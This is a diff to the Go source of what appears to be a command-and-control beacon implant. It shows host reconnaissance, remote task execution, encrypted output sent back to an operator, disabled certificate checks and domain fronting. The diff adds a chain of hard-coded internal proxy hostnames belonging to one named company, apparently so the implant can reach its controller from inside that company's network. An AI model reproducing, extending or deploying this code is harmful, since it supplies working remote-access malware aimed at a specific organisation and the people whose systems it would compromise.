@@ -12,7 +12,6 @@ import (
 	"encoding/json"
 	"io/ioutil"
 	"math/rand"
-	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -34,6 +33,7 @@ type BeaconData struct {
 	Arch      string `json:"Arch"`
 	IPAddr    string `json:"IPAddr"`
 	OS        string `json:"OS"`
+	Sleep     string `json:"Sleep"`
 }
 
 type BeaconTask struct {
@@ -130,17 +130,6 @@ var commands = []Commands{
 		Execute: func(task BeaconTask) (string, error) {
 			result, _ := Command.CpCommand(task.Args)
 			return util.Sprintf("%s", result), nil
-		},
-	},
-	{
-		Name: "cd",
-		Execute: func(task BeaconTask) (string, error) {
-			// 这里可以实现具体的命令执行逻辑
-			util.Println("ls had success!")
-			// 模拟执行耗时
-			time.Sleep(1 * time.Second)
-
-			return util.Sprintf("Executed command: %s with args: %s", task.Command, task.Args), nil
 		},
 	},
 	{
@@ -407,17 +396,7 @@ type HTTPComms struct {
 
 func NewHTTPComms() *HTTPComms {
 	proxyurl := checkproxy()
-	util.Println("proxyurl:", proxyurl)
-	if proxyurl == "" {
-		return &HTTPComms{
-			Schema:   "https",
-			client:   &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}},
-			cancelCh: make(chan struct{}),
-			TaskQueue: &TaskQueue{
-				tasks: make([]BeaconTask, 0),
-			},
-		}
-	} else {
+	if proxyurl != "" {
 		proxyURL, _ := url.Parse(proxyurl)
 		util.Println("Initializing HTTPComms")
 		return &HTTPComms{
@@ -428,6 +407,14 @@ func NewHTTPComms() *HTTPComms {
 				tasks: make([]BeaconTask, 0),
 			},
 		}
+	}
+	return &HTTPComms{
+		Schema:   "https",
+		client:   &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}},
+		cancelCh: make(chan struct{}),
+		TaskQueue: &TaskQueue{
+			tasks: make([]BeaconTask, 0),
+		},
 	}
 }
 
@@ -454,6 +441,7 @@ func GetBeaconData() *BeaconData {
 	integrity := sysinfo.GetIntegrity()
 	procid, procname := sysinfo.GetProcInfo()
 	user := sysinfo.GetUser()
+	sleep := util.Sprintf("%d", config.TimeOut/time.Millisecond)
 	return &BeaconData{
 		ID:        id,
 		HostName:  hostname,
@@ -464,6 +452,7 @@ func GetBeaconData() *BeaconData {
 		Arch:      arch,
 		IPAddr:    ip,
 		OS:        "Linux",
+		Sleep:     sleep,
 	}
 }
 
@@ -521,6 +510,7 @@ func (hc *HTTPComms) sendRequest() error {
 	req.URL.Host = frontdomain
 	util.Println("Request URL:", req.URL.Host)
 	util.Println("Request Host:", req.Host)
+	util.Println("Cookie:", cookieString)
 	resp, err := hc.client.Do(req)
 	if err != nil {
 		util.Println("Error making HTTP request:", err)
@@ -615,7 +605,7 @@ func (hc *HTTPComms) HandleTaskAsync(task BeaconTask) {
 
 func SendTaskOutAsync(hc *HTTPComms, task BeaconTask, id, output string) {
 	go func() {
-		println("taskout:", output)
+		util.Println("taskout:", output)
 		// 加密任务输出
 		taskOut := BeaconTaskOut{
 			Id:       id,
@@ -733,23 +723,13 @@ func checkproxy() string {
 	client := &http.Client{}
 	req, _ := http.NewRequest("GET", "http://www.baidu.com", nil)
 	testtransport := &http.Transport{
-		// Proxy: http.ProxyURL(proxyURL),
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true, // 忽略证书验证
 		},
 	}
-	// proxyurl, _ := url.Parse("http://192.168.80.1:8080")
-	// testtransport.Proxy = http.ProxyURL(proxyurl)
-	// client.Transport = testtransport
-	// resp, _ := client.Do(req)
-	// if resp.StatusCode == 200 {
-	// 	util.Println("http://192.168.80.1:8080")
-	// 	return "http://192.168.80.1:8080"
-	// } else if isDomainReachable("www.baidu.com") {
-	// 	util.Println("no proxy")
-	// 	return ""
-	// }
-	if !isDomainReachable("www.baidu.com") {
+	client.Transport = testtransport
+	resp, _ := client.Do(req)
+	if resp.StatusCode != 200 {
 		proxyurl, _ := url.Parse("http://proxysys.his.hihonor.com:8080")
 		testtransport.Proxy = http.ProxyURL(proxyurl)
 		client.Transport = testtransport
@@ -764,12 +744,28 @@ func checkproxy() string {
 			if resp.StatusCode == 200 {
 				return "http://proxy.chengdutest.itsec.hihonor.com:8080"
 			} else {
-				proxyurl, _ := url.Parse("http://proxy.singapore.itsec.hihonor.com:8080")
+				proxyurl, _ := url.Parse("http://proxysys.singapore.itsec.hihonor.com:8080")
 				testtransport.Proxy = http.ProxyURL(proxyurl)
 				client.Transport = testtransport
 				resp, _ := client.Do(req)
 				if resp.StatusCode == 200 {
-					return "http://proxy.singapore.itsec.hihonor.com:8080"
+					return "http://proxysys.singapore.itsec.hihonor.com:8080"
+				} else {
+					proxyurl, _ := url.Parse("http://proxy.singaporetest.itsec.hihonor.com:8080")
+					testtransport.Proxy = http.ProxyURL(proxyurl)
+					client.Transport = testtransport
+					resp, _ := client.Do(req)
+					if resp.StatusCode == 200 {
+						return "http://proxy.singaporetest.itsec.hihonor.com:8080"
+					} else {
+						proxyurl, _ := url.Parse("http://proxy.germany.itsec.hihonor.com:8080")
+						testtransport.Proxy = http.ProxyURL(proxyurl)
+						client.Transport = testtransport
+						resp, _ := client.Do(req)
+						if resp.StatusCode == 200 {
+							return "http://proxy.germany.itsec.hihonor.com:8080"
+						}
+					}
 				}
 			}
 		}
@@ -777,16 +773,6 @@ func checkproxy() string {
 	}
 
 	return ""
-}
-
-func isDomainReachable(domain string) bool {
-	timeout := 5 * time.Second // 设置连接超时时间
-	conn, err := net.DialTimeout("tcp", net.JoinHostPort(domain, "80"), timeout)
-	if err != nil {
-		return false // 如果发生错误，比如超时，那么域名不可达
-	}
-	defer conn.Close() // 不要忘记关闭连接
-	return true        // 如果连接成功，域名可达
 }
 
 func main() {
